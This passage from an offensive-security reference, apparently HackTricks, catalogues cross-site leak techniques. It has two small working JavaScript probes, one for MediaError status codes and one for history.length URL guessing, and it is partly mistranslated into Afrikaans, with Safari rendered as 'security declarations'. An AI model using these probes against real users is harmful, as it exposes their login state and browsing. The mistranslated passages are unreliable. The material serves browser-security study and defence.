* **Summary:** Downloads do not create resource timing entries in the Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar, to the XS-Leak described, a **resource that is downloaded** because of the ContentDisposition header, also does **not create a performance entry**. This technique works in all major browsers.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hulpbron tydsduur inskrywing lek die begin tyd van 'n omleiding.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

We found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However, in **SA** it is possible to detect if the user is **redirected** by the target page, by querying the **Performance API** and checking for the **redirectStart timing data**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Die duur van tydsduur inskrywings is negatief wanneer 'n omleiding plaasvind.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC, the **duration** for requests that result in a **redirect** is **negative** and can thus be **distinguished** from requests that do not result in a redirect.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Hulpbron beskerm met CORP skep nie hulpbron tydsduur inskrywings nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In some cases, the **nextHopProtocol entry** can be used as a leak technique. In GC, when the **CORP header** is set, the nextHopProtocol will be **empty**. Note that SA will not create a performance entry at all for CORP-enabled resources.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Gebruik
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detect if a service worker is registered for a specific origin.
* **Code Example**:

Service workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and **cache resources** to create offline web application.\
If a **resource cached** by a **service worker** is accessed via **iframe**, the resource will be **loaded from the service worker cache**.\
To detect if the resource was **loaded from the service worker** cache the **Performance API** can be used.\
This could also be done with a Timing attack (check the paper for more info).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Tydsduur
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Dit is moontlik om te kyk of 'n hulpbron in die kas gestoor is.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Using the [Performance API](./#performance-api) it's possible to check if a resource is cached.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Dit is moontlik om die netwerkduur van 'n versoek uit die `performance` API te verkry.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Statuskode
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** In Firefox is dit moontlik om akkuraat 'n cross-origin versoek se statuskode te lek.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface se boodskap eienskap identifiseer uniek hulpbronne wat suksesvol laai met 'n unieke string. 'n Aanvaller kan hierdie kenmerk benut deur die boodskapinhoud te observeer, en sodoende die responsstatus van 'n kruis-oorsprong hulpbron af te lei.

### CORS Fout

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Opsomming:** In Veiligheidsverklarings (SA) stel CORS-foutboodskappe onbedoeld die volle URL van omgeleide versoeke bloot.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Hierdie tegniek stel 'n aanvaller in staat om **die bestemming van 'n kruis-oorsprong webwerf se omleiding te onttrek** deur te benut hoe Webkit-gebaseerde blaaiers CORS versoeke hanteer. Spesifiek, wanneer 'n **CORS-geaktiveerde versoek** na 'n teikenwebwerf gestuur word wat 'n omleiding op grond van gebruikersstatus uitreik en die blaaiers die versoek daarna ontken, word die **volle URL van die omleiding se teiken** in die foutboodskap bekend gemaak. Hierdie kwesbaarheid onthul nie net die feit van die omleiding nie, maar stel ook die omleiding se eindpunt en enige **sensitiewe navraagparameters** wat dit mag bevat, bloot.

### SRI Fout

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Opsomming:** In Veiligheidsverklarings (SA) stel CORS-foutboodskappe onbedoeld die volle URL van omgeleide versoeke bloot.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

'n Aanvaller kan **uitgebreide foutboodskappe** benut om die grootte van kruis-oorsprong antwoorde af te lei. Dit is moontlik as gevolg van die meganisme van Subresource Integrity (SRI), wat die integriteitseienskap gebruik om te verifieer dat hulpbronne wat opgevraag is, dikwels van CDN's, nie gemanipuleer is nie. Vir SRI om op kruis-oorsprong hulpbronne te werk, moet hierdie **CORS-geaktiveerd** wees; anders is hulle nie onderhewig aan integriteitskontroles nie. In Veiligheidsverklarings (SA), net soos die CORS-fout XS-Leak, kan 'n foutboodskap vasgevang word nadat 'n fetch versoek met 'n integriteitseienskap misluk. Aanvallers kan doelbewus **hierdie fout ontlok** deur 'n **vals hash waarde** aan die integriteitseienskap van enige versoek toe te ken. In SA onthul die resulterende foutboodskap onbedoeld die inhoudslengte van die aangevraagde hulpbron. Hierdie inligtingslek stel 'n aanvaller in staat om variasies in responsgrootte te onderskei, wat die weg baan vir gesofistikeerde XS-Leak-aanvalle.

### CSP Oortreding/Dekking

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Opsomming:** As slegs die slagoffer se webwerf in die CSP toegelaat word, as ons dit probeer omlei na 'n ander domein, sal die CSP 'n waarneembare fout ontlok.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

'n XS-Leak kan die CSP gebruik om te detecteer of 'n kruis-oorsprong webwerf na 'n ander oorsprong omgeleide is. Hierdie lek kan die omleiding opspoor, maar addisioneel, die domein van die omleidingsteiken lek. Die basiese idee van hierdie aanval is om **die teikendomein op die aanvaller se webwerf toe te laat**. Sodra 'n versoek aan die teikendomein gestuur word, **omlei dit** na 'n kruis-oorsprong domein. **CSP blokkeer** die toegang daartoe en skep 'n **oortredingsverslag wat as 'n lek tegniek gebruik word**. Afhangende van die blaaier, **kan hierdie verslag die teikensite van die omleiding lek**.\
Moderne blaaiers sal nie die URL aandui waarheen dit omgeleide is nie, maar jy kan steeds opspoor dat 'n kruis-oorsprong omleiding ontlok is.

### Cache

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: Bladsy-inhoud
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Opsomming:** Verwyder die l√™er uit die cache. Open die teikenbladsy en kyk of die l√™er in die cache teenwoordig is.
* **Kode Voorbeeld:**

Blaaiers kan een gedeelde cache vir alle webwerwe gebruik. Ongeag hul oorsprong, is dit moontlik om af te lei of 'n teikenbladsy 'n **spesifieke l√™er aangevra het**.

As 'n bladsy 'n beeld laai slegs as die gebruiker ingelog is, kan jy die **hulpbron ongeldig maak** (sodat dit nie meer in die cache is as dit was, sien meer inligting skakels nie), **'n versoek uitvoer** wat daardie hulpbron kan laai en probeer om die hulpbron **met 'n slegte versoek** te laai (bv. deur 'n te lang verwysingskop te gebruik). As die hulpbron laai **nie enige fout ontlok het nie**, is dit omdat dit **in die cache was**.

### CSP Riglyn

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Opsomming:** CSP kop riglyne kan ondersoek word met die CSP iframe eienskap, wat beleidsbesonderhede onthul.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

'n Nuwe kenmerk in Google Chrome (GC) laat webbladsye toe om **'n Inhoudsekuriteitsbeleid (CSP) voor te stel** deur 'n eienskap op 'n iframe-element in te stel, met beleidsriglyne wat saam met die HTTP-versoek oorgedra word. Normaalweg moet die ingebedde inhoud **dit via 'n HTTP-kop goedkeur**, of 'n **foutbladsy word vertoon**. As die iframe egter reeds deur 'n CSP beheer word en die nuut voorgestelde beleid nie meer beperkend is nie, sal die bladsy normaal laai. Hierdie meganisme open 'n pad vir 'n aanvaller om **spesifieke CSP riglyne** van 'n kruis-oorsprong bladsy te detecteer deur die foutbladsy te identifiseer. Alhoewel hierdie kwesbaarheid as reggestel gemerk is, onthul ons bevindings 'n **nuwe lek tegniek** wat in staat is om die foutbladsy te detecteer, wat daarop dui dat die onderliggende probleem nooit ten volle aangespreek is nie.

### **CORP**

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Opsomming:** Hulpbronne wat beveilig is met die Cross-Origin Resource Policy (CORP) sal 'n fout gooi wanneer dit van 'n nie-toegestane oorsprong gevra word.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

Die CORP-kop is 'n relatief nuwe webplatform sekuriteitskenmerk wat, wanneer dit ingestel is, **nie-cors kruis-oorsprong versoeke na die gegewe hulpbron blokkeer**. Die teenwoordigheid van die kop kan opgespoor word, omdat 'n hulpbron wat met CORP beskerm word **'n fout sal gooi wanneer dit gevra word**.

### CORB

* **Insluitingsmetodes**: HTML Elemente
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Opsomming**: CORB kan aanvallers toelaat om te detecteer wanneer die **`nosniff` kop teenwoordig is** in die versoek.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Kyk na die skakel vir meer inligting oor die aanval.

### CORS fout op Oorsprong Reflectie miskonfigurasie <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Opsomming**: As die Oorsprong kop in die kop `Access-Control-Allow-Origin` weerspie√´l word, is dit moontlik om te kyk of 'n hulpbron reeds in die cache is.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In die geval dat die **Oorsprong kop** in die kop `Access-Control-Allow-Origin` **weerspie√´l** word, kan 'n aanvaller hierdie gedrag misbruik om te probeer **verkry** die **hulpbron** in **CORS** modus. As 'n **fout** **nie** ontlok word nie, beteken dit dat dit **korrek van die web verkry is**, as 'n fout **ontlok word**, is dit omdat dit **van die cache** verkry is (die fout verskyn omdat die cache 'n respons met 'n CORS-kop wat die oorspronklike domein toelaat en nie die aanvaller se domein nie, stoor).\
Let daarop dat as die oorsprong nie weerspie√´l word nie, maar 'n wildcard gebruik word (`Access-Control-Allow-Origin: *`), dit nie sal werk nie.

## Leesbare Attribuut Tegniek

### Fetch Omleiding

* **Insluitingsmetodes**: Fetch API
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Opsomming:** GC en SA laat toe om die tipe respons (opake-omleiding) te kontroleer nadat die omleiding voltooi is.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Deur 'n versoek met die Fetch API in te dien met `redirect: "manual"` en ander parameters, is dit moontlik om die `response.type` eienskap te lees en as dit gelyk is aan `opaqueredirect`, dan was die respons 'n omleiding.

### COOP

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Kop
* **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Opsomming:** Bladsye wat beveilig is deur die Cross-Origin Opener Policy (COOP) voorkom toegang vanaf kruis-oorsprong interaksies.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

'n Aanvaller is in staat om die teenwoordigheid van die Cross-Origin Opener Policy (COOP) kop in 'n kruis-oorsprong HTTP-respons af te lei. COOP word deur webtoepassings gebruik om te verhoed dat eksterne webwerwe willekeurige venster verwysings verkry. Die sigbaarheid van hierdie kop kan opgespoor word deur te probeer om toegang te verkry tot die **`contentWindow` verwysing**. In scenario's waar COOP voorwaardelik toegepas word, word die **`opener` eienskap** 'n duidelike aanduiding: dit is **onbeskryf** wanneer COOP aktief is, en **beskryf** in sy afwesigheid.

### URL Maks Lengte - Bediener Kant

* **Insluitingsmetodes**: Fetch API, HTML Elemente
* **Waarneembare Verskil**: Statuskode / Inhoud
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Opsomming:** Detecteer verskille in antwoorde omdat die omleiding responslengte dalk te groot mag wees dat die bediener met 'n fout terug speel en 'n waarskuwing genereer.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

As 'n bediener-kant omleiding **gebruikersinvoer binne die omleiding** en **extra data** gebruik. Dit is moontlik om hierdie gedrag te detecteer omdat bedieners gewoonlik 'n **limiet versoeklengte** het. As die **gebruikersdata** daardie **lengte - 1** is, omdat die **omleiding** **daardie data** gebruik en **iets ekstra** byvoeg, sal dit 'n **fout ontlok wat via Foutgebeurtenisse opspoorbaar is**.

As jy op een of ander manier koekies aan 'n gebruiker kan stel, kan jy ook hierdie aanval uitvoer deur **voldoende koekies in te stel** ([**koekie bom**](../hacking-with-cookies/cookie-bomb.md)) sodat met die **respons se verhoogde grootte** van die **korrekte respons** 'n **fout** ontlok word. In hierdie geval, onthou dat as jy hierdie versoek vanaf 'n selfde webwerf ontlok, `<script>` outomaties die koekies sal stuur (sodat jy vir foute kan kyk).\
'n Voorbeeld van die **koekie bom + XS-Search** kan gevind word in die bedoelde oplossing van hierdie skrywe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` of om in dieselfde konteks te wees, is gewoonlik nodig vir hierdie tipe aanval.

### URL Maks Lengte - Kli√´nt Kant

* **Insluitingsmetodes**: Pop-ups
* **Waarneembare Verskil**: Statuskode / Inhoud
* **Meer inligting**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Opsomming:** Detecteer verskille in antwoorde omdat die omleiding responslengte dalk te groot mag wees vir 'n versoek dat 'n verskil opgemerk kan word.
* **Kode Voorbeeld**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Volgens [Chromium dokumentasie](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), is Chrome se maksimum URL-lengte 2MB.

> In die algemeen het die _webplatform_ nie beperkings op die lengte van URL's nie (alhoewel 2^31 'n algemene limiet is). _Chrome_ beperk URL's tot 'n maksimum lengte van **2MB** om praktiese redes en om te verhoed dat dit ontkenning van diens probleme in inter-proses kommunikasie veroorsaak.

Daarom, as die **omleiding URL** groter in een van die gevalle is, is dit moontlik om dit te laat omlei met 'n **URL groter as 2MB** om die **lengte limiet** te tref. Wanneer dit gebeur, wys Chrome 'n **`about:blank#blocked`** bladsy.

Die **waarneembare verskil** is dat as die **omleiding** voltooi was, `window.origin` 'n **fout** gooi omdat 'n kruis oorsprong nie daardie inligting kan bekom nie. As die **limiet** egter **getref** is en die gelaaide bladsy **`about:blank#blocked`** was, bly die venster se **`origin`** di√© van die **ouer**, wat 'n **toeganklike inligting** is.

Alle ekstra inligting wat nodig is om die **2MB** te bereik, kan via 'n **hash** in die aanvanklike URL bygevoeg word sodat dit **in die omleiding gebruik sal word**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### Maks Omleidings

* **Insluitingsmetodes**: Fetch API, Raamwerke
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Opsomming:** Gebruik die blaaier se omleiding limiet om die voorkoms van URL omleidings te bepaal.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

As die **maks** aantal **omleidings** wat 'n blaaiers kan volg **20** is, kan 'n aanvaller probeer om sy bladsy met **19 omleidings** te laai en uiteindelik die **slagoffer** na die getoetste bladsy te stuur. As 'n **fout** ontlok word, dan was die bladsy besig om die **slagoffer** te probeer **omlei**.

### Geskiedenis Lengte

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: Omleidings
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Opsomming:** JavaScript kode manipuleer die blaaiers geskiedenis en kan toegang verkry word deur die lengte eienskap.
* **Kode Voorbeeld**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **Geskiedenis API** laat JavaScript kode toe om die blaaiers geskiedenis te manipuleer, wat **die bladsye wat deur 'n gebruiker besoek is, stoor**. 'n Aanvaller kan die lengte eienskap as 'n insluitingsmetode gebruik: om JavaScript en HTML navigasie te detecteer.\
**Kontroleer `history.length`**, maak 'n gebruiker **na 'n bladsy** te **navigeer**, **verander** dit **terug** na die selfde oorsprong en **kontroleer** die nuwe waarde van **`history.length`**.

### Geskiedenis Lengte met dieselfde URL

* **Insluitingsmetodes**: Raamwerke, Pop-ups
* **Waarneembare Verskil**: As die URL dieselfde is as die geraamde een
* **Opsomming:** Dit is moontlik om te raai of die ligging van 'n raam/pop-up in 'n spesifieke URL is deur die geskiedenis lengte te misbruik.
* **Kode Voorbeeld**: Hieronder

'n Aanvaller kan JavaScript kode gebruik om die **raam/pop-up ligging na 'n geraamde een te manipuleer** en dit **onmiddellik** **na `about:blank` te verander**. As die geskiedenis lengte toeneem, beteken dit die URL was korrek en dit het tyd gehad om te **verhoog omdat die URL nie herlaai word as dit dieselfde is nie**. As dit nie toeneem nie, beteken dit dit **het probeer om die geraamde URL te laai**, maar omdat ons **onmiddellik daarna** **`about:blank`** gelaai het, het die **geskiedenis lengte nooit toegenomen** toe die geraamde url gelaai is.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Evalueer die hoeveelheid iframe-elemente deur die `window.length` eienskap te inspekteer.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Tel die **aantal rame in 'n web** wat via `iframe` of `window.open` geopen is, kan help om die **status van die gebruiker oor daardie bladsy** te identifiseer.\
Boonop, as die bladsy altyd dieselfde aantal rame het, kan die **deurlopende** kontrole van die aantal rame help om 'n **patroon** te identifiseer wat inligting kan lek.

'n Voorbeeld van hierdie tegniek is dat in chrome, 'n **PDF** met **rame tel** opgespoor kan word omdat 'n `embed` intern gebruik word. Daar is [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) wat 'n mate van beheer oor die inhoud toelaat soos `zoom`, `view`, `page`, `toolbar` waar hierdie tegniek interessant kan wees.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Lees die gelekte waarde om tussen 2 moontlike toestande te onderskei
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Inligtingslek deur HTML-elemente is 'n bekommernis in websekuriteit, veral wanneer dinamiese media-l√™ers gegenereer word op grond van gebruikersinligting, of wanneer watermerke bygevoeg word, wat die media-grootte verander. Dit kan deur aanvallers benut word om tussen moontlike toestande te onderskei deur die inligting wat deur sekere HTML-elemente blootgestel word, te analiseer.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Hierdie element onthul die media se `duration` en `buffered` tye, wat via sy API verkry kan word. [Lees meer oor HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Dit stel `videoHeight` en `videoWidth` bloot. In sommige blaaiers is addisionele eienskappe soos `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, en `webkitDecodedFrameCount` beskikbaar, wat meer diepgaande inligting oor die media-inhoud bied. [Lees meer oor HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Hierdie funksie bied besonderhede oor video-afspeelkwaliteit, insluitend `totalVideoFrames`, wat die hoeveelheid video-data wat verwerk is, kan aandui. [Lees meer oor getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Hierdie element lek die `height` en `width` van 'n beeld. As 'n beeld egter ongeldig is, sal hierdie eienskappe 0 teruggee, en die `image.decode()` funksie sal verwerp word, wat dui op die mislukking om die beeld korrek te laai. [Lees meer oor HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifiseer variasies in webwerf-styling wat verband hou met die gebruiker se toestand of status.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webtoepassings kan die **webwerf-styling verander op grond van die gebruiker se status**. Cross-origin CSS-l√™ers kan op die aanvallersbladsy met die **HTML skakel-element** ingesluit word, en die **re√´ls** sal op die aanvallersbladsy **toegepas** word. As 'n bladsy hierdie re√´ls dinamies verander, kan 'n aanvaller hierdie **verskille** opspoor, afhangende van die gebruiker se toestand.\
As 'n lek tegniek kan die aanvaller die `window.getComputedStyle` metode gebruik om **CSS** eienskappe van 'n spesifieke HTML-element te **lees**. As gevolg hiervan kan 'n aanvaller arbitr√™re CSS-eienskappe lees as die betrokke element en eienskapnaam bekend is.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Ontdek of die `:visited` styl op 'n URL toegepas is wat aandui dat dit reeds besoek is
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Volgens [**hierdie**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), werk dit nie in headless Chrome nie.
{% endhint %}

Die CSS `:visited` selektor word gebruik om URL's anders te styl as hulle voorheen deur die gebruiker besoek is. In die verlede kon die `getComputedStyle()` metode gebruik word om hierdie stylverskille te identifiseer. Moderne blaaiers het egter sekuriteitsmaatre√´ls ge√Ømplementeer om te voorkom dat hierdie metode die toestand van 'n skakel onthul. Hierdie maatre√´ls sluit in dat die berekende styl altyd teruggegee word asof die skakel besoek is en dat die style wat met die `:visited` selektor toegepas kan word, beperk is.

